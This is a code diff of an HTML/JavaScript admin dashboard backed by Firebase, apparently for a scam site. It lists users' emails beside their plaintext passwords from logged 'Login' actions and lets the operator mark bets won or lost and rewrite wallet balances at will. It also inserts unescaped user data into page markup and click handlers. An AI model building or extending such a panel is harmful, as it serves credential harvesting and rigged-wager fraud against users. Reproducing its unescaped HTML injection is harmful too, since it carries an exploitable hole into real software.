@@ -3,114 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard | Future Connect</title>
+    <title>CONTROL CENTER | WISHWORK</title>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;900&display=swap" rel="stylesheet">
     <style>
-        :root { --bg: #020205; --card-bg: rgba(255, 255, 255, 0.03); --accent-blue: #38bdf8; --accent-purple: #c084fc; --neon-green: #22c55e; --neon-red: #ef4444; }
-        body { margin: 0; font-family: 'Outfit', sans-serif; background: var(--bg); color: white; padding: 20px; overflow-x: hidden; }
-        h1 { font-weight: 900; font-size: 1.8rem; margin: 0; background: linear-gradient(to right, var(--accent-blue), var(--accent-purple)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-align: center; }
-
-        /* BROADCAST CENTER */
-        .broadcast-box { background: linear-gradient(145deg, rgba(56, 189, 248, 0.1), rgba(192, 132, 252, 0.1)); padding: 20px; border-radius: 24px; margin-bottom: 25px; border: 1px solid rgba(255,255,255,0.1); }
-        .broadcast-box input { width: 100%; padding: 12px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); background: rgba(0,0,0,0.3); color: white; outline: none; margin-bottom: 10px; }
-        .send-btn { width: 100%; padding: 12px; border: none; border-radius: 12px; background: var(--accent-blue); color: white; font-weight: 900; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
-
-        /* MAP VISUAL */
-        .map-container { height: 120px; background: var(--card-bg); border-radius: 28px; margin-bottom: 25px; border: 1px solid rgba(255,255,255,0.05); position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; }
-        .map-grid { position: absolute; width: 200%; height: 200%; background-image: radial-gradient(rgba(56, 189, 248, 0.1) 1px, transparent 0); background-size: 20px 20px; transform: rotateX(45deg); top: -50%; animation: grid-move 20s linear infinite; }
-        @keyframes grid-move { from { transform: rotateX(45deg) translateY(0); } to { transform: rotateX(45deg) translateY(200px); } }
-        .pulse-marker { width: 10px; height: 10px; background: var(--accent-blue); border-radius: 50%; box-shadow: 0 0 15px var(--accent-blue); animation: pulse-ring 2s infinite; }
-        @keyframes pulse-ring { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(4); opacity: 0; } }
-
-        /* TABLE */
-        .stats-container { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
-        .stat-card { background: var(--card-bg); padding: 15px; border-radius: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); }
-        #adminSearch { width: 100%; padding: 16px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); background: var(--card-bg); color: white; margin-bottom: 20px; outline: none; }
-        .table-wrapper { background: var(--card-bg); border-radius: 28px; overflow-x: auto; border: 1px solid rgba(255,255,255,0.05); }
-        table { width: 100%; border-collapse: collapse; min-width: 500px; }
-        td { padding: 14px 15px; border-bottom: 1px solid rgba(255,255,255,0.02); font-size: 12px; }
-        .type-tag { font-weight: 900; font-size: 9px; padding: 4px 8px; border-radius: 6px; text-transform: uppercase; }
-        .tag-login { background: rgba(192, 132, 252, 0.15); color: var(--accent-purple); }
-        .tag-bet { background: rgba(56, 189, 248, 0.15); color: var(--accent-blue); }
-        .win-btn { background: var(--neon-green); color: white; border: none; padding: 6px 10px; border-radius: 8px; font-weight: 900; cursor: pointer; }
-        .loss-btn { background: var(--neon-red); color: white; border: none; padding: 6px 10px; border-radius: 8px; font-weight: 900; cursor: pointer; }
+        :root { --bg: #020205; --accent: #38bdf8; --red: #ef4444; --green: #22c55e; }
+        body { margin: 0; font-family: 'Outfit', sans-serif; background: var(--bg); color: white; padding: 20px; }
+        h1 { text-align: center; font-weight: 900; background: linear-gradient(to right, #38bdf8, #c084fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        
+        .card { background: rgba(255,255,255,0.03); border-radius: 20px; padding: 20px; border: 1px solid rgba(255,255,255,0.1); margin-bottom: 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th { text-align: left; font-size: 10px; color: var(--accent); text-transform: uppercase; padding: 10px; }
+        td { padding: 12px 10px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; }
+        
+        .btn { padding: 6px 12px; border: none; border-radius: 8px; font-weight: 900; cursor: pointer; color: white; margin: 2px; }
+        .win { background: var(--green); }
+        .loss { background: var(--red); }
+        .del { background: #444; font-size: 10px; }
+        
+        input { width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; color: white; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
-<h1>🛠 CONTROL CENTER</h1>
+<h1>CONTROL CENTER</h1>
 
-<div class="broadcast-box">
-    <div style="font-size: 10px; color: var(--accent-blue); margin-bottom: 8px; font-weight: 800;">GLOBAL BROADCAST 📡</div>
-    <input type="text" id="broadcastMsg" placeholder="Type message to all users...">
-    <button class="send-btn" onclick="sendBroadcast()">Send Announcement</button>
-</div>
-
-<div class="map-container">
-    <div class="map-grid"></div>
-    <div class="pulse-marker"></div>
-</div>
-
-<div class="stats-container">
-    <div class="stat-card"><h2 id="totalEntries">0</h2><p style="font-size: 9px; color: #64748b;">LOGS</p></div>
-    <div class="stat-card"><h2 id="totalUsers" style="color: var(--accent-purple);">0</h2><p style="font-size: 9px; color: #64748b;">SQUAD</p></div>
-</div>
-
-<input type="text" id="adminSearch" placeholder="🔍 Search email..." onkeyup="filterTable()">
-
-<div class="table-wrapper">
+<div class="card">
+    <input type="text" id="search" placeholder="Search user email..." onkeyup="filter()">
     <table>
-        <tbody id="tableBody"></tbody>
+        <thead>
+            <tr>
+                <th>User (Click to Balance)</th>
+                <th>Amt/Pass</th>
+                <th>Type</th>
+                <th>Action</th>
+            </tr>
+        </thead>
+        <tbody id="adminBody"></tbody>
     </table>
 </div>
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getFirestore, collection, query, orderBy, onSnapshot, doc, setDoc, getDoc, deleteDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    import { getFirestore, collection, query, orderBy, onSnapshot, doc, deleteDoc, updateDoc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
     const firebaseConfig = { apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8", authDomain: "home-help-service.firebaseapp.com", projectId: "home-help-service", storageBucket: "home-help-service.firebasestorage.app", messagingSenderId: "160722457510", appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567" };
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    window.sendBroadcast = async () => {
-        const msg = document.getElementById("broadcastMsg").value;
-        if(!msg) return;
-        await setDoc(doc(db, "settings", "broadcast"), { message: msg, time: serverTimestamp() });
-        alert("Broadcast Sent! 📡");
-        document.getElementById("broadcastMsg").value = "";
+    // Update Balance Manually
+    window.setBal = async (email) => {
+        const val = prompt(`Enter new balance for ${email}:`);
+        if(val !== null) await setDoc(doc(db, "wallets", email), { balance: parseInt(val) });
     };
 
-    window.updateBalance = async (email) => {
-        const bal = prompt(`Set wallet for ${email}:`);
-        if (bal) await setDoc(doc(db, "wallets", email), { balance: parseInt(bal) }, { merge: true });
+    // Delete Log
+    window.delLog = async (id) => {
+        if(confirm("Terminate this log?")) await deleteDoc(doc(db, "users", id));
     };
 
-    window.setResult = async (id, res, email, amt) => {
+    // Set Result (Win/Loss)
+    window.resolve = async (id, res, email, amtStr) => {
+        const amt = parseInt(amtStr.replace(/[^\d]/g, ''));
         await updateDoc(doc(db, "users", id), { status: res });
-        if (res.includes("WIN")) {
+        
+        if(res === "WIN 🏆") {
             const snap = await getDoc(doc(db, "wallets", email));
-            const win = parseInt(amt.replace(/[^\d]/g, '')) * 2;
-            if (snap.exists()) await updateDoc(doc(db, "wallets", email), { balance: snap.data().balance + win });
+            const cur = snap.exists() ? snap.data().balance : 0;
+            await setDoc(doc(db, "wallets", email), { balance: cur + (amt * 2) });
         }
     };
 
     onSnapshot(query(collection(db, "users"), orderBy("time", "desc")), (snap) => {
-        const body = document.getElementById("tableBody");
-        let html = ""; let users = new Set();
+        const body = document.getElementById("adminBody");
+        let html = "";
         snap.forEach(d => {
-            const data = d.data(); users.add(data.email);
-            const isBet = data.actionType.includes("Bet") && (data.status === "PENDING" || !data.status);
-            let tagClass = data.actionType.includes("Bet") ? "tag-bet" : "tag-login";
-            html += `<tr>
-                <td><span style="color:white;cursor:pointer" onclick="updateBalance('${data.email}')">${data.email.split('@')[0]}</span></td>
-                <td style="color:#64748b">${data.password}</td>
-                <td><span class="type-tag ${tagClass}">${data.actionType.split(':')[0]}</span></td>
-                <td>${isBet ? `<button class="win-btn" onclick="setResult('${d.id}','WIN 🏆','${data.email}','${data.password}')">W</button> <button class="loss-btn" onclick="setResult('${d.id}','LOST 💀','${data.email}','${data.password}')">L</button>` : `<span style="font-weight:bold;color:#475569">${data.status || 'LOG'}</span>`}</td>
-            </tr>`;
+            const data = d.data();
+            const isPending = data.status === "PENDING";
+            html += `
+                <tr>
+                    <td onclick="setBal('${data.email}')" style="cursor:pointer; color:var(--accent)">${data.email.split('@')[0]}</td>
+                    <td>${data.password}</td>
+                    <td>${data.actionType}</td>
+                    <td>
+                        ${isPending ? `
+                            <button class="btn win" onclick="resolve('${d.id}','WIN 🏆','${data.email}','${data.password}')">W</button>
+                            <button class="btn loss" onclick="resolve('${d.id}','LOST 💀','${data.email}','${data.password}')">L</button>
+                        ` : `<span>${data.status}</span>`}
+                        <button class="btn del" onclick="delLog('${d.id}')">×</button>
+                    </td>
+                </tr>`;
         });
         body.innerHTML = html;
-        document.getElementById("totalEntries").innerText = snap.size;
-        document.getElementById("totalUsers").innerText = users.size;
     });
 </script>
 </body>
